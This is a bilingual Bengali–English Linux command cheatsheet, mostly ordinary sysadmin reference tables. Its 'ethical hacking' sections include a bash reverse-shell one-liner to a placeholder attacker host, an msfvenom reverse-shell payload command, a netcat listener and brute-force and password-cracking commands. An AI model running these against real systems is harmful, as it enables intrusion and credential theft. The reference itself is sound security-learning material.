# 🐧 **Linux OS & Scripting — Full Cheatsheet (Basic to Advanced)**

# Part-1

## 📌 1. Basic Commands (ফাউন্ডেশন)

| Command | Full Meaning          | কেন ব্যবহার হয়                       | বাস্তব Example         |
| ------- | --------------------- | ------------------------------------ | ---------------------- |
| `pwd`   | **Print Working Dir** | বর্তমানে কোন ডিরেক্টরিতে আছ তা দেখতে | `pwd`                  |
| `ls`    | **List**              | ফোল্ডারের কনটেন্ট দেখতে              | `ls -la`               |
| `cd`    | **Change Directory**  | ফোল্ডার পরিবর্তন করতে                | `cd /var/log`          |
| `touch` | **Create File**       | খালি ফাইল তৈরি করতে                  | `touch test.txt`       |
| `mkdir` | **Make Directory**    | নতুন ডিরেক্টরি তৈরি করতে             | `mkdir projects`       |
| `rm`    | **Remove**            | ফাইল/ফোল্ডার ডিলিট করতে              | `rm -rf old_files/`    |
| `cp`    | **Copy**              | ফাইল কপি করতে                        | `cp file.txt /tmp/`    |
| `mv`    | **Move/Rename**       | ফাইল মুভ বা রিনেম করতে               | `mv old.txt new.txt`   |
| `cat`   | **Concatenate**       | ফাইল কন্টেন্ট দেখতে                  | `cat /etc/hosts`       |
| `less`  | **View with Scroll**  | লম্বা ফাইল দেখতে                     | `less /var/log/syslog` |

---

## 📌 2. User & Account Management (তুমি আগে লিখেছ + আরও)

| Command  | Full Meaning      | কেন ব্যবহার হয়           | বাস্তব Example |
| -------- | ----------------- | ------------------------ | -------------- |
| `whoami` | **Who Am I**      | আমি কোন ইউজারে আছি দেখতে | `whoami`       |
| `id`     | **User ID**       | UID, GID চেক করতে        | `id hacker`    |
| `last`   | **Login History** | লগইন হিস্ট্রি দেখতে      | `last -n 5`    |
| `w`      | **Who is Online** | কে লগইন আছে + প্রসেস     | `w`            |

---

## 📌 3. Process & Job Control

| Command | Full Meaning       | কেন ব্যবহার হয়                | বাস্তব Example |               |
| ------- | ------------------ | ----------------------------- | -------------- | ------------- |
| `ps`    | **Process Status** | রানিং প্রসেস দেখতে            | \`ps aux       | grep apache\` |
| `top`   | **Task Manager**   | লাইভ CPU/MEM চেক করতে         | `top`          |               |
| `htop`  | **Human Top**      | সুন্দর ভিউ সহ প্রসেস চেক      | `htop`         |               |
| `kill`  | **Kill Process**   | PID দিয়ে প্রসেস বন্ধ করতে     | `kill -9 1234` |               |
| `jobs`  | **Jobs List**      | ব্যাকগ্রাউন্ড জব দেখতে        | `jobs`         |               |
| `fg`    | **Foreground**     | ব্যাকগ্রাউন্ড জবকে সামনে আনতে | `fg %1`        |               |

---

## 📌 4. File Permissions & Ownership

| Command   | Full Meaning         | কেন ব্যবহার হয়               | বাস্তব Example                   |
| --------- | -------------------- | ---------------------------- | -------------------------------- |
| `chmod`   | **Change Mode**      | ফাইলের পারমিশন পরিবর্তন করতে | `chmod 755 script.sh`            |
| `chown`   | **Change Owner**     | মালিক পরিবর্তন করতে          | `chown root:root file`           |
| `ls -l`   | **List Long Format** | পারমিশন + মালিক দেখতে        | `ls -l /etc/passwd`              |
| `getfacl` | **Get ACL**          | ফাইল ACL চেক করতে            | `getfacl file.txt`               |
| `setfacl` | **Set ACL**          | ফাইল ACL সেট করতে            | `setfacl -m u:hacker:r file.txt` |

---

## 📌 5. Package Management

| Distro            | Install            | Update/Upgrade              | Remove            |
| ----------------- | ------------------ | --------------------------- | ----------------- |
| **Debian/Ubuntu** | `apt install nmap` | `apt update && apt upgrade` | `apt remove nmap` |
| **RedHat/CentOS** | `yum install nmap` | `yum update`                | `yum remove nmap` |
| **Arch**          | `pacman -S nmap`   | `pacman -Syu`               | `pacman -R nmap`  |

---

## 📌 6. Logs & Auditing

| Command      | Full Meaning        | কেন ব্যবহার হয়          | বাস্তব Example              |             |
| ------------ | ------------------- | ----------------------- | --------------------------- | ----------- |
| `journalctl` | **Systemd Logs**    | সিস্টেম লগ চেক করতে     | `journalctl -xe`            |             |
| `dmesg`      | **Driver Messages** | Kernel message চেক করতে | \`dmesg                     | grep eth0\` |
| `tail -f`    | **Follow Log**      | লাইভ লগ মনিটর করতে      | `tail -f /var/log/auth.log` |             |

---

## 📌 7. Networking (Extended)

| Command    | Full Meaning         | কেন ব্যবহার হয়                 | বাস্তব Example        |
| ---------- | -------------------- | ------------------------------ | --------------------- |
| `ip a`     | **IP Address**       | নেটওয়ার্ক ইন্টারফেস ও IP দেখতে | `ip a`                |
| `ifconfig` | **Interface Config** | IP অ্যাসাইন করতে (পুরোনো)      | `ifconfig eth0 up`    |
| `route`    | **Routing Table**    | রাউটিং টেবিল চেক করতে          | `route -n`            |
| `ss`       | **Socket Stats**     | ওপেন পোর্ট দেখতে               | `ss -tuln`            |
| `nmap`     | **Network Mapper**   | পোর্ট স্ক্যান করতে             | `nmap -sV target.com` |

---

## 📌 8. Archiving & Compression

| Command | Full Meaning     | কেন ব্যবহার হয়      | বাস্তব Example                  |
| ------- | ---------------- | ------------------- | ------------------------------- |
| `tar`   | **Tape Archive** | আর্কাইভ তৈরি করতে   | `tar -czvf backup.tar.gz /etc/` |
| `gzip`  | **GNU Zip**      | ফাইল কমপ্রেস করতে   | `gzip largefile.txt`            |
| `unzip` | **Unzip File**   | ZIP ফাইল আনজিপ করতে | `unzip exploit.zip`             |

---

## 📌 9. Bash Scripting (Extended)

| Command | Full Meaning     | কেন ব্যবহার হয়                      | বাস্তব Example          |                                   |                         |   |                    |
| ------- | ---------------- | ----------------------------------- | ----------------------- | --------------------------------- | ----------------------- | - | ------------------ |
| `$?`    | **Exit Status**  | আগের কমান্ড সফল হয়েছে কিনা চেক করতে | `echo $?`               |                                   |                         |   |                    |
| `&&`    | **AND Operator** | আগের কমান্ড সফল হলে পরেরটি চালাবে   | `mkdir test && cd test` |                                   |                         |   |                    |
| \`      |                  | \`                                  | **OR Operator**         | আগের কমান্ড ফেল হলে অন্যটি চালাবে | \`grep root /etc/passwd |   | echo "Not Found"\` |
| `cron`  | **Cron Jobs**    | শিডিউল টাস্ক করতে                   | `crontab -e`            |                                   |                         |   |                    |
| `alias` | **Shortcut**     | শর্টকাট কমান্ড বানাতে               | `alias ll='ls -la'`     |                                   |                         |   |                    |

---

## 📌 10. Security & Forensics (Advance)

| Command      | Full Meaning          | কেন ব্যবহার হয়                         | বাস্তব Example      |
| ------------ | --------------------- | -------------------------------------- | ------------------- |
| `netstat`    | **Network Status**    | ওপেন কানেকশন চেক করতে                  | `netstat -tuln`     |
| `lsof`       | **List Open Files**   | কোন ফাইল কোন প্রসেস ব্যবহার করছে দেখতে | `lsof -i :80`       |
| `chkrootkit` | **Rootkit Scanner**   | রুটকিট চেক করতে                        | `chkrootkit`        |
| `rkhunter`   | **Rootkit Hunter**    | সিস্টেম ইনট্রুশন ডিটেক্ট করতে          | `rkhunter --check`  |
| `gpg`        | **GNU Privacy Guard** | ফাইল এনক্রিপ্ট/ডিক্রিপ্ট করতে          | `gpg -c secret.txt` |

---

## 📌 11. Ethical Hacking Tools Integration

| Tool          | Use Case               | Example Command                                   |
| ------------- | ---------------------- | ------------------------------------------------- |
| `hydra`       | ব্রুট ফোর্স লগইন টেস্ট | `hydra -l admin -P pass.txt ssh://192.168.1.10`   |
| `aircrack-ng` | WiFi হ্যাকিং           | `aircrack-ng handshake.cap -w wordlist.txt`       |
| `metasploit`  | এক্সপ্লয়ট রান করা     | `msfconsole`                                      |
| `sqlmap`      | SQL Injection পরীক্ষা  | `sqlmap -u "http://site.com/page.php?id=1" --dbs` |
| `wireshark`   | GUI Packet Analysis    | `wireshark`                                       |

---

# Part-2
## 👤 User & Account Management

| Command   | Full Meaning             | কেন ব্যবহার হয়                  | বাস্তব Example                 |
| --------- | ------------------------ | ------------------------------- | ------------------------------ |
| `adduser` | **Add User**             | নতুন ইউজার তৈরি করতে            | `sudo adduser hacker`          |
| `userdel` | **Delete User**          | ইউজার রিমুভ করতে                | `sudo userdel hacker`          |
| `usermod` | **User Modify**          | ইউজারকে নতুন গ্রুপে অ্যাড করতে  | `sudo usermod -aG sudo hacker` |
| `passwd`  | **Change Password**      | ইউজারের পাসওয়ার্ড পরিবর্তন করতে | `passwd hacker`                |
| `groups`  | **Show Groups**          | ইউজার কোন গ্রুপে আছে দেখতে      | `groups hacker`                |
| `who`     | **Show Logged-in Users** | কে লগইন করেছে দেখতে             | `who`                          |

---

## 🔒 Advanced Permissions

| Command  | Full Meaning          | কেন ব্যবহার হয়                                     | বাস্তব Example         |
| -------- | --------------------- | -------------------------------------------------- | ---------------------- |
| `umask`  | **User Mask**         | নতুন ফাইল/ডিরেক্টরির ডিফল্ট পারমিশন নিয়ন্ত্রণ করতে | `umask 022`            |
| `stat`   | **File Status**       | ফাইলের ডিটেইলস দেখতে (size, inode, modify time)    | `stat /etc/passwd`     |
| `lsattr` | **List Attributes**   | ফাইল অ্যাট্রিবিউট দেখতে (immutable files)          | `lsattr /etc/passwd`   |
| `chattr` | **Change Attributes** | ফাইলকে immutable বা append-only বানাতে             | `chattr +i secret.txt` |

---

## 📊 System Monitoring & Diagnostics

| Command  | Full Meaning                  | কেন ব্যবহার হয়              | বাস্তব Example         |
| -------- | ----------------------------- | --------------------------- | ---------------------- |
| `free`   | **Free Memory**               | RAM ও Swap ব্যবহার চেক করতে | `free -h`              |
| `vmstat` | **Virtual Memory Statistics** | CPU, Memory, IO usage দেখতে | `vmstat 2`             |
| `iostat` | **Input/Output Statistics**   | ডিস্ক IO চেক করতে           | `iostat -xz 2`         |
| `uptime` | **System Uptime**             | সিস্টেম কতক্ষণ অন আছে দেখতে | `uptime`               |
| `lsblk`  | **List Block Devices**        | ডিস্ক পার্টিশন দেখতে        | `lsblk`                |
| `mount`  | **Mount Filesystem**          | ডিস্ক বা ড্রাইভ মাউন্ট করতে | `mount /dev/sdb1 /mnt` |
| `umount` | **Unmount Filesystem**        | মাউন্ট আনমাউন্ট করতে        | `umount /mnt`          |
| `df`     | **Disk Free Space**           | ডিস্ক স্পেস চেক করতে        | `df -h`                |
| `du`     | **Disk Usage**                | ফোল্ডারের সাইজ দেখতে        | `du -sh /var/log`      |

---

## 🌐 Advanced Networking

| Command      | Full Meaning                    | কেন ব্যবহার হয়                       | বাস্তব Example                     |
| ------------ | ------------------------------- | ------------------------------------ | ---------------------------------- |
| `curl`       | **Client URL**                  | ওয়েব কনটেন্ট ডাউনলোড করতে            | `curl http://example.com`          |
| `wget`       | **Web Get**                     | ওয়েব থেকে ফাইল আনার জন্য             | `wget http://example.com/file.zip` |
| `nc`         | **Netcat**                      | পোর্ট স্ক্যান ও ব্যাকডোর তৈরি করতে   | `nc -lvnp 4444`                    |
| `telnet`     | **Telecommunication Network**   | রিমোট সার্ভারে কানেক্ট করতে          | `telnet 192.168.1.1 80`            |
| `dig`        | **Domain Information Groper**   | DNS ইনফো পেতে                        | `dig example.com MX`               |
| `nslookup`   | **Name Server Lookup**          | DNS রেজল্যুশন চেক করতে               | `nslookup example.com`             |
| `traceroute` | **Trace Route**                 | নেটওয়ার্ক পথ ট্রেস করতে              | `traceroute google.com`            |
| `arp`        | **Address Resolution Protocol** | IP ↔ MAC ম্যাপিং দেখতে               | `arp -a`                           |
| `tcpdump`    | **TCP Dump**                    | লাইভ নেটওয়ার্ক ট্রাফিক ক্যাপচার করতে | `sudo tcpdump -i eth0 port 80`     |

---

## 📂 File Integrity & Forensics

| Command     | Full Meaning         | কেন ব্যবহার হয়                            | বাস্তব Example        |
| ----------- | -------------------- | ----------------------------------------- | --------------------- |
| `md5sum`    | **MD5 Checksum**     | ফাইলের ইন্টেগ্রিটি যাচাই করতে             | `md5sum file.txt`     |
| `sha256sum` | **SHA-256 Checksum** | সিকিউর চেক করতে                           | `sha256sum file.txt`  |
| `file`      | **File Type**        | ফাইলের ধরন চেক করতে                       | `file exploit.bin`    |
| `strings`   | **Extract Strings**  | binary ফাইল থেকে readable টেক্সট বের করতে | `strings exploit.bin` |
| `hexdump`   | **Hex Dump**         | ফাইলের হেক্সাডেসিমাল ভিউ দেখতে            | `hexdump -C file.txt` |

---

## 📦 File Transfer & Remote Access

| Command | Full Meaning               | কেন ব্যবহার হয়               | বাস্তব Example                                      |
| ------- | -------------------------- | ---------------------------- | --------------------------------------------------- |
| `scp`   | **Secure Copy**            | রিমোট সার্ভারে ফাইল কপি করতে | `scp secret.txt user@192.168.1.5:/tmp/`             |
| `rsync` | **Remote Sync**            | দ্রুত ফাইল sync করতে         | `rsync -avz /home/user/ hacker@192.168.1.5:/backup` |
| `ftp`   | **File Transfer Protocol** | FTP সার্ভারে কানেক্ট করতে    | `ftp ftp.example.com`                               |
| `ssh`   | **Secure Shell**           | রিমোট লগইন করতে              | `ssh user@192.168.1.10`                             |

---

## 🖥️ Bash Scripting Essentials

| Command | Full Meaning              | কেন ব্যবহার হয়                    | বাস্তব Example                              |
| ------- | ------------------------- | --------------------------------- | ------------------------------------------- |
| `echo`  | **Echo Print**            | টেক্সট বা ভ্যারিয়েবল প্রিন্ট করতে | `echo "Hello Hacker"`                       |
| `read`  | **Read Input**            | ইউজার ইনপুট নিতে                  | `read name; echo $name`                     |
| `for`   | **For Loop**              | রিপিটেড টাস্ক অটোমেট করতে         | `for i in {1..5}; do echo $i; done`         |
| `while` | **While Loop**            | কন্ডিশনাল রিপিটেড কাজ             | `while true; do date; sleep 2; done`        |
| `if`    | **Conditional Execution** | শর্ত অনুসারে কাজ চালাতে           | `if [ -f file.txt ]; then echo "Found"; fi` |
| `grep`  | **Search with Regex**     | লগ বা ফাইল সার্চ করতে             | `grep "error" /var/log/syslog`              |
| `awk`   | **Pattern Processing**    | টেক্সট ফিল্ড প্রসেস করতে          | `awk '{print $1}' /etc/passwd`              |
| `sed`   | **Stream Editor**         | টেক্সট রিপ্লেস করতে               | `sed 's/root/admin/g' file.txt`             |
| `cut`   | **Cut Fields**            | টেক্সট থেকে নির্দিষ্ট কলাম কাটতে  | `cut -d: -f1 /etc/passwd`                   |


# Part‑3

# 🐧 **Linux OS & Scripting — Full Cheatsheet (Basic → Advanced → Security)**

## 📌 12. Disk & Partition Management

| Command    | Full Meaning         | কেন ব্যবহার হয়              | বাস্তব Example               |
| ---------- | -------------------- | --------------------------- | ---------------------------- |
| `fdisk`    | **Format Disk**      | ডিস্ক পার্টিশন তৈরি করতে    | `sudo fdisk /dev/sda`        |
| `parted`   | **Partition Editor** | GPT/MBR পার্টিশন করতে       | `sudo parted /dev/sdb`       |
| `mkfs`     | **Make Filesystem**  | নতুন ফাইল সিস্টেম তৈরি করতে | `mkfs.ext4 /dev/sda1`        |
| `fsck`     | **Filesystem Check** | ফাইল সিস্টেম এরর ঠিক করতে   | `fsck /dev/sda1`             |
| `blkid`    | **Block ID**         | ডিস্কের UUID দেখতে          | `blkid`                      |
| `mount -o` | **Mount Options**    | নির্দিষ্ট অপশনে মাউন্ট করতে | `mount -o ro /dev/sda1 /mnt` |

---

## 📌 13. Firewall & Security

| Command     | Full Meaning         | কেন ব্যবহার হয়                     | বাস্তব Example                                  |
| ----------- | -------------------- | ---------------------------------- | ----------------------------------------------- |
| `ufw`       | **Uncomplicated FW** | সহজভাবে ফায়ারওয়াল কনফিগার করতে     | `ufw allow 22/tcp`                              |
| `iptables`  | **IP Tables**        | অ্যাডভান্সড প্যাকেট ফিল্টারিং করতে | `iptables -A INPUT -p tcp --dport 80 -j ACCEPT` |
| `firewalld` | **Firewall Daemon**  | CentOS/RHEL firewall               | `firewall-cmd --add-service=http`               |
| `fail2ban`  | **Login Protection** | brute force ব্লক করতে              | `fail2ban-client status sshd`                   |

---

## 📌 14. Services & Daemons

| Command     | Full Meaning        | কেন ব্যবহার হয়                      | বাস্তব Example           |
| ----------- | ------------------- | ----------------------------------- | ------------------------ |
| `systemctl` | **System Control**  | সার্ভিস স্টার্ট/স্টপ/রিস্টার্ট করতে | `systemctl restart ssh`  |
| `service`   | **Service Manager** | পুরোনো সিস্টেমে সার্ভিস ম্যানেজ     | `service apache2 status` |
| `chkconfig` | **Check Config**    | বুট টাইমে সার্ভিস চালু হবে কিনা সেট | `chkconfig sshd on`      |

---

## 📌 15. File Search & Indexing

| Command   | Full Meaning      | কেন ব্যবহার হয়                   | বাস্তব Example          |
| --------- | ----------------- | -------------------------------- | ----------------------- |
| `find`    | **Find Files**    | সিস্টেমে ফাইল সার্চ করতে         | `find / -name "*.conf"` |
| `locate`  | **Locate Files**  | ডাটাবেস থেকে দ্রুত সার্চ         | `locate passwd`         |
| `which`   | **Which Binary**  | কোন path এ কমান্ড আছে দেখতে      | `which python3`         |
| `whereis` | **Where is File** | বাইনারি + ম্যানুয়াল লোকেশন দেখতে | `whereis ssh`           |

---

## 📌 16. Performance Tuning & Benchmark

| Command  | Full Meaning        | কেন ব্যবহার হয়               | বাস্তব Example   |
| -------- | ------------------- | ---------------------------- | ---------------- |
| `sar`    | **System Activity** | CPU, Memory usage রিপোর্ট    | `sar -u 5 10`    |
| `stress` | **Stress Test**     | সিস্টেম CPU/RAM টেস্ট        | `stress --cpu 4` |
| `dstat`  | **Dynamic Stats**   | CPU, disk, network, IO usage | `dstat`          |
| `iotop`  | **IO Top**          | কোন প্রসেস IO খাচ্ছে দেখতে   | `iotop`          |

---

## 📌 17. Backups & Snapshots

| Command | Full Meaning     | কেন ব্যবহার হয়               | বাস্তব Example                      |
| ------- | ---------------- | ---------------------------- | ----------------------------------- |
| `dd`    | **Disk Dump**    | পুরো ডিস্ক/পার্টিশন কপি করতে | `dd if=/dev/sda of=/backup/sda.img` |
| `rsync` | **Remote Sync**  | ইনক্রিমেন্টাল ব্যাকআপ নিতে   | `rsync -av /data /mnt/backup`       |
| `tar`   | **Tape Archive** | আর্কাইভ ও ব্যাকআপ করতে       | `tar -cvf backup.tar /home`         |

---

## 📌 18. Kernel & Hardware

| Command   | Full Meaning         | কেন ব্যবহার হয়          | বাস্তব Example  |                |
| --------- | -------------------- | ----------------------- | --------------- | -------------- |
| `uname`   | **Unix Name**        | Kernel version জানতে    | `uname -r`      |                |
| `lsmod`   | **List Modules**     | Kernel modules দেখতে    | `lsmod`         |                |
| `modinfo` | **Module Info**      | মডিউলের বিস্তারিত দেখতে | `modinfo e1000` |                |
| `lscpu`   | **List CPU Info**    | CPU তথ্য দেখতে          | `lscpu`         |                |
| `lspci`   | **List PCI Devices** | PCI devices দেখতে       | \`lspci         | grep Network\` |
| `lsusb`   | **List USB Devices** | USB devices দেখতে       | `lsusb`         |                |

---

## 📌 19. Encryption & Hashing

| Command   | Full Meaning          | কেন ব্যবহার হয়                | বাস্তব Example                                                   |          |
| --------- | --------------------- | ----------------------------- | ---------------------------------------------------------------- | -------- |
| `openssl` | **OpenSSL Toolkit**   | SSL/TLS সার্টিফিকেট তৈরি      | `openssl req -new -x509 -keyout key.pem -out cert.pem -days 365` |          |
| `base64`  | **Base64 Encode**     | ডাটা এনকোড/ডিকোড করতে         | \`echo "hacker"                                                  | base64\` |
| `sha1sum` | **SHA1 Hash**         | ফাইলের SHA1 hash বের করতে     | `sha1sum file.txt`                                               |          |
| `gpg`     | **GNU Privacy Guard** | ফাইল এনক্রিপ্ট/ডিক্রিপ্ট করতে | `gpg -c secrets.txt`                                             |          |

---

## 📌 20. Exploitation & Post‑Exploitation (Ethical Hacking)

| Tool         | Use Case                      | Example Command                                                                  |
| ------------ | ----------------------------- | -------------------------------------------------------------------------------- |
| `ncat`       | রিভার্স শেল সেটআপ             | `ncat -lvnp 4444`                                                                |
| `bash`       | শেল রিভার্স                   | `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`                                      |
| `msfvenom`   | Payload Generate              | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf` |
| `john`       | পাসওয়ার্ড ক্র্যাকিং (John)    | `john --wordlist=rockyou.txt hashes.txt`                                         |
| `hashcat`    | GPU ভিত্তিক পাসওয়ার্ড ক্র্যাক | `hashcat -m 0 hashes.txt rockyou.txt`                                            |
| `linpeas.sh` | Privilege Escalation Script   | `./linpeas.sh`                                                                   |
